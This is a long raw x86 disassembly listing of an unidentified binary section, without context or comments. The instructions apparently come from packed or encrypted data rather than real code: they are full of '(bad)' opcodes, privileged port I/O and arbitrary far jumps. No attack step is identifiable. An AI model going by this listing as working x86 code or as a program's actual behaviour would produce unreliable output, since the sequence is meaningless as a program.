  414a2f:	cvtpi2ps xmm1,QWORD PTR [edx+edx*4-0x65d2d947]
  414a37:	mov    WORD PTR [ebx-0x4b],?
  414a3a:	jl     0x414a92
  414a3c:	js     0x414ab8
  414a3e:	mov    eax,0xc32d4ffc
  414a43:	and    ecx,DWORD PTR [esi+0x157e4aa9]
  414a49:	xlat   BYTE PTR ds:[ebx]
  414a4a:	xor    DWORD PTR [esi+eiz*2],esi
  414a4d:	pusha  
  414a4e:	shl    bh,1
  414a50:	fadd   st,st(3)
  414a52:	sbb    DWORD PTR [edi],ecx
  414a54:	pop    ebx
  414a55:	and    DWORD PTR [eax],0xc
  414a58:	ret    0xe446
  414a5b:	repz dec edx
  414a5d:	fadd   st,st(3)
  414a5f:	xchg   esp,eax
  414a60:	and    BYTE PTR [ebp-0x7a],bl
  414a63:	xor    eax,0xa4ccd348
  414a68:	nop
  414a69:	outs   dx,BYTE PTR ds:[esi]
  414a6a:	imul   ebx,DWORD PTR [ebx-0x6e495cfa],0xffffff9f
  414a71:	mov    esi,0x8cfda7f3
  414a76:	push   ecx
  414a77:	dec    eax
  414a78:	icebp  
  414a79:	shr    BYTE PTR [eax],1
  414a7b:	les    esp,FWORD PTR [ebx-0x56]
  414a7e:	in     eax,0xe1
  414a80:	int3   
  414a81:	pop    ecx
  414a82:	mov    ecx,0x3bb15217
  414a87:	sbb    ebp,esp
  414a89:	cmp    edi,DWORD PTR [eax]
  414a8b:	xchg   esi,eax
  414a8c:	aaa    
  414a8d:	add    al,0xf
  414a8f:	es jne 0x414a2e
  414a92:	fistp  QWORD PTR [eax]
  414a94:	std    
  414a95:	mov    eax,ds:0x76949095
  414a9a:	ins    BYTE PTR es:[edi],dx
  414a9b:	adc    DWORD PTR [ecx],eax
  414a9d:	jbe    0x414a50
  414a9f:	mov    WORD PTR [esi-0x4d1f4826],fs
  414aa5:	dec    ebp
  414aa6:	js     0x414a55
  414aa8:	shr    ecx,0x79
  414aab:	leave  
  414aac:	lds    edx,FWORD PTR [ebp+0x7927f5ec]
  414ab2:	xchg   esi,eax
  414ab3:	not    DWORD PTR [eax-0x7d]
  414ab6:	mov    DWORD PTR [eax-0x3c],esp
  414ab9:	stos   BYTE PTR es:[edi],al
  414aba:	pop    ss
  414abb:	leave  
  414abc:	(bad)  
  414abd:	ins    BYTE PTR es:[edi],dx
  414abe:	imul   ebp,DWORD PTR [edi+0xd],0xb
  414ac2:	sub    al,BYTE PTR [ebx]
  414ac4:	(bad)  
  414ac5:	out    dx,eax
  414ac6:	and    eax,0x261467fb
  414acb:	int    0xa9
  414acd:	outs   dx,DWORD PTR ds:[esi]
  414ace:	mov    ch,bl
  414ad0:	mov    eax,ds:0x36fbd86
  414ad5:	pop    ecx
  414ad6:	fwait
  414ad7:	dec    edx
  414ad8:	jmp    0x414aee
  414ada:	imul   ecx,DWORD PTR [edx+0x2611fe3c],0xa7547014
  414ae4:	in     al,0xb2
  414ae6:	fs scas eax,DWORD PTR es:[edi]
  414ae8:	std    
  414ae9:	stos   DWORD PTR es:[edi],eax
  414aea:	sbb    al,0x6e
  414aec:	mov    dh,0x4c
  414aee:	(bad)  
  414aef:	mov    esp,0xccbb30da
  414af4:	dec    esp
  414af5:	jnp    0x414ae6
  414af7:	es lahf 
  414af9:	push   cs
  414afa:	mov    bh,BYTE PTR [esi]
  414afc:	add    al,0xfe
  414afe:	mov    esp,0xe99fc74c
  414b03:	inc    ebp
  414b04:	repnz in al,0x5b
  414b07:	out    0xc0,eax
  414b09:	(bad)  
  414b0a:	js     0x414a9f
  414b0c:	adc    eax,0xef2b752
  414b11:	neg    DWORD PTR [eax-0x57]
  414b14:	jbe    0x414b5e
  414b16:	or     al,0x7b
  414b18:	dec    eax
  414b19:	push   edi
  414b1a:	lahf   
  414b1b:	test   DWORD PTR [edx-0x44],eax
  414b1e:	jo     0x414aba
  414b20:	repnz or esp,DWORD PTR [ecx+0x464be282]
  414b27:	inc    ebp
  414b28:	xor    BYTE PTR [ecx-0x44],dh
  414b2b:	cli    
  414b2c:	sbb    BYTE PTR gs:[ecx+0x609eaa07],cl
  414b33:	jmp    0x414b52
  414b35:	out    0x45,eax
  414b37:	fnstsw ax
  414b39:	aam    0xc
  414b3b:	ss ss inc esi
  414b3e:	int3   
  414b3f:	jno    0x414b2b
  414b41:	xor    ah,dh
  414b43:	mov    al,ds:0x9287bd81
  414b48:	xchg   ebp,eax
  414b49:	pushf  
  414b4a:	rcr    edi,cl
  414b4c:	or     al,0xab
  414b4e:	pop    edi
  414b4f:	push   es
  414b50:	popf   
  414b51:	call   0x10e1:0x7f6b86e
  414b58:	add    DWORD PTR [ebp+0x7b],ebp
  414b5b:	vpsrlw ymm7,ymm3,XMMWORD PTR [eax+0x2f5d1fd8]
  414b63:	push   ds
  414b64:	outs   dx,DWORD PTR ds:[esi]
  414b65:	fdivr  DWORD PTR [ebp-0x392e30a9]
  414b6b:	xor    esp,DWORD PTR [esi-0x15]
  414b6e:	clc    
  414b6f:	pop    ss
  414b70:	add    eax,0xaecfbbec
  414b75:	sahf   
  414b76:	fs mov dl,0xec
  414b79:	(bad)  
  414b7a:	out    dx,eax
  414b7b:	inc    edx
  414b7c:	outs   dx,BYTE PTR ds:[esi]
  414b7d:	jmp    0x2271:0xdf1d90f3
  414b84:	lahf   
  414b85:	fstp   DWORD PTR [ebp+0x19]
  414b88:	loop   0x414b53
  414b8a:	call   0x244d4e7
  414b8f:	call   0x85eae6c1
  414b94:	xor    ecx,DWORD PTR [esi+eiz*4]
  414b97:	mov    esi,0xd9bd9a4
  414b9c:	out    0x78,al
  414b9e:	sub    al,0xef
  414ba0:	leave  
  414ba1:	pushf  
  414ba2:	fcom   QWORD PTR [edi+0x5cc80ae]
  414ba8:	cli    
  414ba9:	(bad)  
  414baa:	cmp    ebx,DWORD PTR [edi-0x74c914ec]
  414bb0:	cmc    
  414bb1:	and    eax,DWORD PTR [eax]
  414bb3:	rcl    DWORD PTR [ecx-0x7f],1
  414bb6:	repnz add edx,DWORD PTR [esi-0x2714670b]
  414bbd:	inc    edx
  414bbe:	cmp    DWORD PTR ds:0xfc83337,esi
  414bc4:	push   eax
  414bc5:	cld    
  414bc6:	test   DWORD PTR [ecx+0x14d9b46a],0x243b429e
  414bd0:	and    BYTE PTR [ecx-0x7c],ch
  414bd3:	mov    ebp,es
  414bd5:	lock gs pusha 
  414bd8:	das    
  414bd9:	mov    eax,0x2701ee63
  414bde:	inc    esi
  414bdf:	cld    
  414be0:	xor    ecx,ecx
  414be2:	push   esi
  414be3:	or     cl,dh
  414be5:	ja     0x414bcb
  414be7:	push   ds
  414be8:	test   DWORD PTR [ebp-0x66],esp
  414beb:	in     al,0xbf
  414bed:	mov    eax,ds:0x161687f9
  414bf2:	mov    esp,0xd705397
  414bf7:	in     al,dx
  414bf8:	push   0x7c12c7a
  414bfd:	xor    dh,bh
  414bff:	sub    al,0x1
  414c01:	and    BYTE PTR [edx+0x14b6a448],dh
  414c07:	adc    DWORD PTR [eax],esi
  414c09:	pop    ds
  414c0a:	push   ecx
  414c0b:	lods   eax,DWORD PTR ds:[esi]
  414c0c:	mov    ebx,0xdb18e23b
  414c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c12:	repz js 0x414c76
  414c15:	cmp    eax,0x34b1fa5c
  414c1a:	sub    edx,DWORD PTR [edi-0x67]
  414c1d:	je     0x414bea
  414c1f:	push   eax
  414c20:	add    dh,BYTE PTR [edi]
  414c22:	aad    0xaf
  414c24:	fisttp QWORD PTR [edx+0xb]
  414c27:	add    al,0x49
  414c29:	pop    ebx
  414c2a:	xchg   esp,eax
  414c2b:	pop    ebx
  414c2c:	rcl    DWORD PTR [eax],1
  414c2e:	mov    ch,0x5f
  414c30:	mov    bl,0x1e
  414c32:	jmp    0x414be4
  414c34:	rol    ebx,1
  414c36:	ins    BYTE PTR es:[edi],dx
  414c37:	pop    ebp
  414c38:	nop
  414c39:	pop    ss
  414c3a:	mov    DWORD PTR [ecx],esp
  414c3c:	cld    
  414c3d:	cmp    dh,BYTE PTR [edi-0x4c]
  414c40:	push   0xaf1538a1
  414c45:	int3   
  414c46:	ins    BYTE PTR es:[edi],dx
  414c47:	pop    ebx
  414c48:	jae    0x414c32
  414c4a:	test   eax,0x103607e9
  414c4f:	cmp    bh,BYTE PTR [ebx+0x19]
  414c52:	xlat   BYTE PTR ds:[ebx]
  414c53:	xor    eax,0x1a962872
  414c58:	data16 out dx,al
  414c5a:	lahf   
  414c5b:	pop    es
  414c5c:	add    al,0x72
  414c5e:	hlt    
  414c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c60:	xchg   edx,eax
  414c61:	outs   dx,BYTE PTR ds:[esi]
  414c62:	sub    eax,0x36c16b48
  414c67:	js     0x414cde
  414c69:	pop    edx
  414c6a:	std    
  414c6b:	pop    ebp
  414c6c:	dec    ebp
  414c6d:	push   edx
  414c6e:	popa   
  414c6f:	mov    eax,ds:0x24449a54
  414c74:	repz repnz popf 
  414c77:	aad    0x3e
  414c79:	aas    
  414c7a:	dec    esp
  414c7b:	sub    BYTE PTR [esi+0x1bb1746f],bl
  414c81:	pop    ebx
  414c82:	mov    eax,ds:0x8c553b21
  414c87:	gs loopne 0x414c57
  414c8a:	dec    esp
  414c8b:	fisubr DWORD PTR [edi+eiz*8]
  414c8e:	or     DWORD PTR [ecx],0x18cf5227
  414c94:	repnz int3 
  414c96:	ficom  DWORD PTR [ebp+0x47]
  414c99:	push   0x7a6810ca
  414c9e:	fist   WORD PTR [eax]
  414ca0:	ja     0x414cbd
  414ca2:	or     ebx,ebx
  414ca4:	xlat   BYTE PTR ds:[ebx]
  414ca5:	mov    BYTE PTR [ebx],bl
  414ca7:	loop   0x414c84
  414ca9:	pop    esp
  414caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cab:	pop    edx
  414cac:	dec    edi
  414cad:	je     0x414c9a
  414caf:	sti    
  414cb0:	into   
  414cb1:	call   0x21d3:0xf2b7b927
  414cb8:	imul   edx,esi,0xffffff8d
  414cbb:	rol    DWORD PTR [eax+esi*4-0x4b],0xa2
  414cc0:	into   
  414cc1:	aaa    
  414cc2:	pop    edi
  414cc3:	mov    eax,0xf23a3ad
  414cc8:	aas    
  414cc9:	xchg   esi,eax
  414cca:	lods   eax,DWORD PTR ds:[esi]
  414ccb:	adc    BYTE PTR [eax],0x53
  414cce:	fstp   TBYTE PTR [ecx+ebx*4]
  414cd1:	dec    esi
  414cd2:	aad    0x88
  414cd4:	sbb    BYTE PTR [ebx-0x5ceca0be],bh
  414cda:	xchg   BYTE PTR [edx],dh
  414cdc:	mov    ebx,0x5737a291
  414ce1:	push   eax
  414ce2:	push   ds
  414ce3:	das    
  414ce4:	outs   dx,BYTE PTR ds:[esi]
  414ce5:	or     BYTE PTR [ecx],cl
  414ce7:	and    dh,BYTE PTR [ebx+0x68]
  414cea:	ins    DWORD PTR es:[edi],dx
  414ceb:	ins    DWORD PTR es:[edi],dx
  414cec:	mov    al,ds:0xbb09e808
  414cf1:	add    BYTE PTR [ecx],0x99
  414cf4:	mov    cl,0x27
  414cf6:	and    eax,0xa353f392
  414cfb:	retf   
  414cfc:	icebp  
  414cfd:	xchg   edx,eax
  414cfe:	pop    eax
  414cff:	out    dx,eax
  414d00:	loop   0x414d6d
  414d02:	vpmacsdql xmm15,xmm5,xmm4,XMMWORD PTR [ebx-0x54]
  414d09:	out    dx,eax
  414d0a:	or     DWORD PTR [ebp-0x24fae095],ebp
  414d10:	mov    ebp,0xf50c01d2
  414d15:	lahf   
  414d16:	ficomp DWORD PTR [ecx]
  414d18:	sbb    esp,DWORD PTR [edx+0x201e75f1]
  414d1e:	shl    BYTE PTR [edx+ebx*1+0x21],cl
  414d22:	aas    
  414d23:	and    DWORD PTR [edi-0xa5ff8e9],ecx
  414d29:	popa   
  414d2a:	sahf   
  414d2b:	push   0x5b5bd848
  414d30:	fwait
  414d31:	(bad)  
  414d32:	cwde   
  414d33:	lods   al,BYTE PTR ds:[esi]
  414d34:	sar    BYTE PTR [edx+ebx*8-0x59],1
  414d38:	or     eax,0x6e30623a
  414d3d:	xchg   DWORD PTR [eax-0x28e13b17],esp
  414d43:	xchg   BYTE PTR [esi+edx*1+0x2ca9d946],bh
  414d4a:	mov    ah,BYTE PTR [esi]
  414d4c:	iret   
  414d4d:	test   DWORD PTR [ebx+0x5d],eax
  414d50:	inc    eax
  414d51:	mov    al,0xe4
  414d53:	clc    
  414d54:	in     al,dx
  414d55:	cmp    dh,BYTE PTR [edi+0x7e]
  414d58:	or     BYTE PTR [edi+0xfed6cfb],dh
  414d5e:	pop    edi
  414d5f:	jp     0x414ddb
  414d61:	bound  edi,QWORD PTR [ebx-0x65d92a26]
  414d67:	imul   edx,ecx,0xa1e19485
  414d6d:	sub    al,0x76
  414d6f:	and    BYTE PTR gs:[eax],dl
  414d72:	inc    ecx
  414d73:	std    
  414d74:	adc    eax,ebx
  414d76:	sbb    ch,dh
  414d78:	stos   DWORD PTR es:[edi],eax
  414d79:	inc    ebx
  414d7a:	jb     0x414dc9
  414d7c:	push   esp
  414d7d:	jle    0x414d66
  414d7f:	pop    edx
  414d80:	adc    al,0xbb
  414d82:	push   esp
  414d83:	dec    eax
  414d84:	cmp    DWORD PTR [ebx],eax
  414d86:	fs dec ebp
  414d88:	lods   eax,DWORD PTR ds:[esi]
  414d89:	in     eax,dx
  414d8a:	mov    ebx,0xb5f3e7d8
  414d8f:	aas    
  414d90:	gs mov esp,0xd6c02f8
  414d96:	ja     0x414e11
  414d98:	dec    ebx
  414d99:	imul   ecx,DWORD PTR [ebx],0xfffffff2
  414d9c:	fdivr  st(5),st
  414d9e:	push   eax
  414d9f:	shl    cl,1
  414da1:	out    dx,eax
  414da2:	fistp  QWORD PTR [esi+0x3f]
  414da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414da6:	pusha  
  414da7:	xchg   esp,eax
  414da8:	mov    ds:0x6d859738,al
  414dad:	or     DWORD PTR [edi],0x3a
  414db0:	jno    0x414dc0
  414db2:	add    BYTE PTR [eax],al
  414db4:	imul   eax
  414db6:	xor    BYTE PTR ds:[ebx-0x1b],dl
  414dba:	stos   BYTE PTR es:[edi],al
  414dbb:	xchg   esi,eax
  414dbc:	stc    
  414dbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dbe:	cld    
  414dbf:	sub    eax,0x699b0558
  414dc4:	out    0x98,eax
  414dc6:	mov    ebp,0x506fa22d
  414dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dcc:	daa    
  414dcd:	aaa    
  414dce:	and    BYTE PTR [edi+0x5b],bl
  414dd1:	int    0x3b
  414dd3:	jp     0x414db3
  414dd5:	(bad)  
  414dd6:	aam    0xd5
  414dd8:	mov    eax,0x54b9479
  414ddd:	push   ecx
  414dde:	lds    esi,FWORD PTR [ebx+0x1db6d37b]
  414de4:	sub    BYTE PTR [ecx+0x2de02213],cl
  414dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414deb:	loope  0x414e0b
  414ded:	or     bh,BYTE PTR [eax]
  414def:	jmp    0x22b5:0x37925f31
  414df6:	pop    ebp
  414df7:	cli    
  414df8:	jecxz  0x414de6
  414dfa:	sub    esp,DWORD PTR [ebp-0x55]
  414dfd:	scas   al,BYTE PTR es:[edi]
  414dfe:	mov    bl,0xd4
  414e00:	xor    dh,BYTE PTR [eax+0x7]
  414e03:	xor    dl,BYTE PTR [esi-0x511cd142]
  414e09:	push   esp
  414e0a:	adc    eax,0x221b7c93
  414e0f:	xchg   esi,eax
  414e10:	xor    edi,esi
  414e12:	rcr    DWORD PTR [edi],1
  414e14:	xor    eax,0x323e8371
  414e19:	xchg   edi,eax
  414e1a:	bound  esi,QWORD PTR [edi+ebp*1-0x11a332bc]
  414e21:	jo     0x414e3e
  414e23:	xchg   ecx,eax
  414e24:	ins    DWORD PTR es:[edi],dx
  414e25:	aam    0xbc
  414e27:	rcl    BYTE PTR [eax+0x76c7c68f],cl
  414e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e2e:	xchg   edi,eax
  414e2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e30:	(bad)  
  414e31:	popa   
  414e32:	in     al,dx
  414e33:	sahf   
  414e34:	xchg   edx,eax
  414e35:	adc    DWORD PTR [esi-0x52],0x9e64b7f8
  414e3c:	xchg   ebx,eax
  414e3d:	xlat   BYTE PTR ds:[ebx]
  414e3e:	inc    esp
  414e3f:	into   
  414e40:	cdq    
  414e41:	mov    bl,0x91
  414e43:	clc    
  414e44:	mov    ch,BYTE PTR [ebx-0x3c9d6cb7]
  414e4a:	pop    edi
  414e4b:	push   eax
  414e4c:	jo     0x414eb6
  414e4e:	mov    dh,0x5c
  414e50:	rol    DWORD PTR ds:0x9a77b276,1
  414e56:	jmp    0xab046416
  414e5b:	or     cl,bh
  414e5d:	std    
  414e5e:	lock dec esp
  414e60:	ror    DWORD PTR [eax+0x25],cl
  414e63:	or     edx,ebx
  414e65:	jns    0x414e26
  414e67:	nop
  414e68:	imul   ecx,DWORD PTR [eax-0x34bb84ca],0xffffffc5
  414e6f:	add    bl,BYTE PTR [ebp+edi*2+0x19]
  414e73:	mov    ds:0x6b0ec64e,eax
  414e78:	push   ds
  414e79:	jno    0x414e47
  414e7b:	mov    bh,0x7b
  414e7d:	push   0x53
  414e7f:	jae    0x414e6e
  414e81:	repz dec ecx
  414e83:	mov    DWORD PTR [eax+ebp*8],edx
  414e86:	mov    ecx,0x62ef3dc
  414e8b:	push   esi
  414e8c:	outs   dx,BYTE PTR ds:[esi]
  414e8d:	dec    edi
  414e8e:	mov    cl,0xe2
  414e90:	xor    edx,ebx
  414e92:	fnstcw WORD PTR [eax+0x7c]
  414e95:	and    eax,0xe332a6bc
  414e9a:	jns    0x414ebd
  414e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e9d:	fld    DWORD PTR [ebp+0x55f1c775]
  414ea3:	push   cs
  414ea4:	dec    esi
  414ea5:	push   0xffffffe3
  414ea7:	jg     0x414e29
  414ea9:	jo     0x414e7c
  414eab:	pmaddwd mm2,QWORD PTR [edx+0x45]
  414eaf:	xor    BYTE PTR [eax+0x2b],dh
  414eb2:	jmp    0x196e:0xa3ceb932
  414eb9:	call   DWORD PTR [edi-0x2ae1321c]
  414ebf:	pop    ss
  414ec0:	int    0x1b
  414ec2:	popa   
  414ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ec4:	or     BYTE PTR [ebx+0x3f5e8646],0x2b
  414ecb:	sar    BYTE PTR [edi-0x4d720682],1
  414ed1:	add    bh,BYTE PTR [ecx]
  414ed3:	fwait
  414ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ed5:	aaa    
  414ed6:	not    BYTE PTR [ebx+eiz*2]
  414ed9:	mov    al,0x12
  414edb:	push   ebx
  414edc:	retf   0x2a6
  414edf:	or     al,0x63
  414ee1:	icebp  
  414ee2:	mov    esp,0xa43438d7
  414ee7:	test   DWORD PTR [ecx-0x43bf6383],esp
  414eed:	mov    ah,0xde
  414eef:	pop    es
  414ef0:	dec    ebp
  414ef1:	sbb    DWORD PTR [ebp+0x56],0xfffffffe
  414ef5:	(bad)  [eax+0x2cd81f5e]
  414efb:	cmp    BYTE PTR [esi+0x6e],0x6a
  414eff:	push   edi
  414f00:	xor    eax,0xcf9e728e
  414f05:	test   al,0xa
  414f07:	adc    edi,ebp
  414f09:	in     eax,dx
  414f0a:	and    eax,DWORD PTR [eax-0x74fcc27f]
  414f10:	je     0x414ec1
  414f12:	push   cs
  414f13:	mov    WORD PTR [ebx-0x31],?
  414f16:	pop    ebx
  414f17:	or     al,0x6b
  414f19:	push   esp
  414f1a:	inc    ecx
  414f1b:	clc    
  414f1c:	dec    ecx
  414f1d:	nop
  414f1e:	in     al,0x55
  414f20:	xor    bl,0xcf
  414f23:	in     eax,0xcf
  414f25:	shl    DWORD PTR [edx+0x47588f4c],1
  414f2b:	dec    edx
  414f2c:	ds daa 
  414f2e:	cmp    eax,0xade91084
  414f33:	inc    esi
  414f34:	mov    cl,0x84
  414f36:	push   ebx
  414f37:	xor    BYTE PTR [ebp+0x30a17e26],ch
  414f3d:	pusha  
  414f3e:	int    0x67
  414f40:	dec    edi
  414f41:	(bad)  
  414f42:	mov    edi,ecx
  414f44:	mov    eax,ds:0xd98d1ecb
  414f49:	lds    ebx,FWORD PTR [edx-0x6d]
  414f4c:	jbe    0x414f4a
  414f4e:	xchg   esi,eax
  414f4f:	inc    ebp
  414f50:	lahf   
  414f51:	mov    ds:0x8bc1dfc8,al
  414f56:	sbb    DWORD PTR [ebx+0x2b],0xe72b41db
  414f5d:	shr    DWORD PTR [ecx+0x7cef34ce],0x58
  414f64:	sbb    edx,esi
  414f66:	(bad)  
  414f67:	loop   0x414f09
  414f69:	sbb    eax,0x86570513
  414f6e:	sti    
  414f6f:	ret    
  414f70:	loope  0x414f2e
  414f72:	stos   DWORD PTR es:[edi],eax
  414f73:	mov    bl,0xf5
  414f75:	push   0x4c38253f
  414f7a:	arpl   WORD PTR [ecx+0x4e],ax
  414f7d:	dec    ebp
  414f7e:	(bad)  
  414f80:	(bad)  [ebx+0x3053741d]
  414f86:	push   ds
  414f87:	lock inc ebx
  414f89:	sbb    eax,DWORD PTR [ebp-0x4643df2f]
  414f8f:	push   ss
  414f90:	inc    esp
  414f91:	fs ret 
  414f93:	mov    ebp,0x35a4f3ce
  414f98:	test   BYTE PTR [ebx+0x9e1cdde],dh
  414f9e:	jle    0x414fbe
  414fa0:	(bad)  
  414fa2:	gs pop esp
  414fa4:	hlt    
  414fa5:	shl    BYTE PTR [ecx+0x39],cl
  414fa8:	ror    DWORD PTR [esi-0x53],0x51
  414fac:	push   esi
  414fad:	push   eax
  414fae:	xchg   DWORD PTR [edi-0x1a3d44a2],esp
  414fb4:	jne    0x414f97
  414fb6:	dec    esp
  414fb7:	sti    
  414fb8:	or     DWORD PTR [edi],0x2d
  414fbb:	pop    eax
  414fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fbd:	pop    ebx
  414fbe:	mov    bl,0x49
  414fc0:	aas    
  414fc1:	iret   
  414fc2:	or     DWORD PTR [eax],ebp
  414fc4:	test   eax,0x45a5529b
  414fc9:	add    BYTE PTR [ecx-0x2e],bh
  414fcc:	cmp    BYTE PTR [ebp+0x33],0x57
  414fd0:	into   
  414fd1:	stos   DWORD PTR es:[edi],eax
  414fd2:	pop    ds
  414fd3:	stos   BYTE PTR es:[edi],al
  414fd4:	add    eax,0xe072f012
  414fd9:	call   0xa13497fb
  414fde:	xchg   ebp,eax
  414fdf:	inc    ebp
  414fe0:	xchg   esi,esi
  414fe2:	add    eax,0xe87e4031
  414fe7:	add    eax,0x9d3f4e8f
  414fec:	jmp    0xcf281cbb
  414ff1:	push   ecx
  414ff2:	mov    dh,0xcc
  414ff4:	sbb    BYTE PTR [edx],0xc7
  414ff7:	mov    edi,0x80bb1d20
  414ffc:	shr    BYTE PTR [ebx],cl
  414ffe:	mov    ds:0x80bd898f,eax
  415003:	sbb    BYTE PTR [edx+edi*8-0x89eadef],bl
  41500a:	out    dx,eax
  41500b:	mov    esp,DWORD PTR [ebp-0x47]
  41500e:	clc    
  41500f:	cmp    eax,0x64bc04bb
  415014:	pop    edx
  415015:	jmp    0xc7d518ee
  41501a:	or     al,0x84
  41501c:	xchg   bh,cl
  41501e:	mov    cl,0x73
  415020:	hlt    
  415021:	cwde   
  415022:	call   0xdec609ba
  415027:	into   
  415028:	mov    ecx,0xefb91643
  41502d:	icebp  
  41502e:	or     bl,al
  415030:	pushf  
  415031:	div    DWORD PTR [esi]
  415033:	xchg   ebx,eax
  415034:	sub    al,0xd
  415036:	addr16 mov ebp,0x2116eb0
  41503c:	or     ebp,DWORD PTR [eax+0x47ce2fc9]
  415042:	add    DWORD PTR [ecx-0x45f68348],0x70
  415049:	jp     0x414fcb
  41504b:	mov    esi,0x9fea5af4
  415050:	pop    ebx
  415051:	push   es
  415052:	xor    ebx,ecx
  415054:	jmp    0xa241:0xdfd8019
  41505b:	sti    
  41505c:	mov    ah,al
  41505e:	sub    BYTE PTR [edx+0x5],dl
  415061:	add    edi,DWORD PTR [ecx+ecx*8+0x5]
  415065:	and    DWORD PTR [esi],0xb9b2f3b6
  41506b:	test   eax,0x4580f87b
  415070:	mov    dl,0xc1
  415072:	in     al,0x32
  415074:	sub    al,0x7f
  415076:	test   eax,0x8cb615e5
  41507b:	in     al,dx
  41507c:	sbb    BYTE PTR [ebx-0x1de4f6a4],dl
  415082:	inc    esi
  415084:	imul   esi,edi,0x50
  415087:	jl     0x415042
  415089:	pop    ebp
  41508a:	fldpi  
  41508c:	push   ss
  41508d:	ins    DWORD PTR es:[edi],dx
  41508e:	not    DWORD PTR [edi]
  415090:	sbb    eax,0xb348afb
  415095:	xchg   edx,eax
  415096:	imul   ah
  415098:	sbb    al,0xc1
  41509a:	enter  0xfb07,0x79
  41509e:	push   ds
  41509f:	add    BYTE PTR [esi+0x1],bl
  4150a2:	fisttp DWORD PTR [ecx]
  4150a4:	xor    al,0x1d
  4150a6:	xchg   edx,eax
  4150a7:	sbb    ecx,DWORD PTR [edi-0xf]
  4150aa:	or     ecx,ecx
  4150ac:	sbb    ebp,DWORD PTR [ecx-0x10]
  4150af:	push   eax
  4150b0:	mov    dh,BYTE PTR [esi-0x6841614f]
  4150b6:	push   eax
  4150b8:	in     eax,dx
  4150b9:	jbe    0x415136
  4150bb:	mov    edx,0x3fc0c81e
  4150c0:	mov    bh,0x89
  4150c2:	repnz adc ebx,DWORD PTR cs:[esi]
  4150c6:	(bad)  
  4150c8:	dec    ecx
  4150c9:	and    bh,ah
  4150cb:	enter  0x1e68,0xda
  4150cf:	shr    BYTE PTR [edi-0x3d],0xf7
  4150d3:	xchg   DWORD PTR [ebx+edx*4+0x58],edi
  4150d7:	icebp  
  4150d8:	rcl    BYTE PTR [ecx],0xd8
  4150db:	add    eax,0xf225d49b
  4150e0:	jp     0x415091
  4150e2:	daa    
  4150e3:	cmp    cl,bh
  4150e5:	adc    DWORD PTR [ecx],esp
  4150e7:	ja     0x4150ab
  4150e9:	dec    eax
  4150ea:	or     BYTE PTR [esi+edx*1-0x70],0xfd
  4150ef:	jmp    DWORD PTR [esi]
  4150f1:	or     al,0x65
  4150f3:	out    0x1d,eax
  4150f5:	stos   DWORD PTR es:[edi],eax
  4150f6:	lahf   
  4150f7:	jle    0x415118
  4150f9:	arpl   WORD PTR [esi],ax
  4150fb:	js     0x4150a4
  4150fd:	out    dx,eax
  4150fe:	push   ss
  4150ff:	cli    
  415100:	fucomp st(4)
  415102:	push   0x6db3016e
  415107:	cmp    al,0xda
  415109:	xor    ecx,edi
  41510b:	mov    bl,0xf4
  41510d:	int3   
  41510e:	mov    ebx,0xe0cc7ed0
  415113:	inc    ebx
  415114:	ds mov bl,0xe8
  415117:	mov    al,ds:0xe20da7a6
  41511c:	ja     0x4150ff
  41511e:	mov    esi,0xf3ede61c
  415123:	stc    
  415124:	fiadd  WORD PTR ds:0x1119c024
  41512a:	and    BYTE PTR [ebp-0x3a3ceb44],cl
  415130:	xor    cl,0x7f
  415133:	sti    
  415134:	jecxz  0x415141
  415136:	not    DWORD PTR [edx+esi*2]
  415139:	cli    
  41513a:	mov    bl,0xc2
  41513c:	in     eax,dx
  41513d:	xor    DWORD PTR [edi-0x7f7cb9c0],esi
  415143:	neg    DWORD PTR [esi]
  415145:	nop
  415146:	add    BYTE PTR [eax],ah
  415148:	(bad)  
  415149:	mov    al,ds:0x4c0e69a2
  41514e:	les    ebx,FWORD PTR [ebp-0x5b]
  415151:	adc    DWORD PTR ds:0x4e6ebc57,esi
  415157:	outs   dx,DWORD PTR ds:[esi]
  415158:	xchg   ebp,eax
  415159:	clc    
  41515a:	mov    dh,0xc4
  41515c:	fcmovnbe st,st(7)
  41515e:	mov    ebp,0x3ae2f7aa
  415163:	jl     0x41513a
  415165:	es ffree st(1)
  415168:	repnz xor cx,WORD PTR [ebx]
  41516c:	jae    0x4151ac
  41516e:	popf   
  41516f:	mov    edi,0xa13130b
  415174:	push   ebx
  415175:	xor    al,BYTE PTR [bp+si+0x3bc5]
  41517a:	push   DWORD PTR [esi-0x37]
  41517d:	into   
  41517e:	push   ss
  41517f:	fld    TBYTE PTR [ebp+eiz*4-0x7c3c0e3e]
  415186:	xor    DWORD PTR [ebx-0x3],0xfffffff8
  41518a:	cld    
  41518b:	pusha  
  41518c:	mov    WORD PTR [edx-0x381c2403],?
  415192:	sub    eax,0x17d21633
  415197:	mov    ebp,0xc8e46582
  41519c:	(bad)  
  41519d:	imul   eax,DWORD PTR [ecx+0x39],0x1
  4151a1:	or     ch,BYTE PTR [ebp-0x5d2a9c96]
  4151a7:	inc    edi
  4151a8:	cmp    sp,WORD PTR [esp+ecx*1]
  4151ac:	mov    bl,0x4d
  4151ae:	inc    edx
  4151af:	popf   
  4151b0:	xchg   edx,eax
  4151b1:	sahf   
  4151b2:	mov    ch,0xa4
  4151b4:	ja     0x4151a4
  4151b6:	stos   DWORD PTR es:[edi],eax
  4151b7:	sbb    eax,0xf557967
  4151bc:	adc    al,BYTE PTR [ebx+0x6a550f2c]
  4151c2:	dec    esp
  4151c3:	test   eax,0x421a5fea
  4151c8:	mov    al,0x87
  4151ca:	pop    ebx
  4151cb:	pop    esp
  4151cc:	je     0x41520f
  4151ce:	popa   
  4151cf:	lods   eax,DWORD PTR ds:[esi]
  4151d0:	fdivrp st(1),st
  4151d2:	sar    DWORD PTR [eax],1
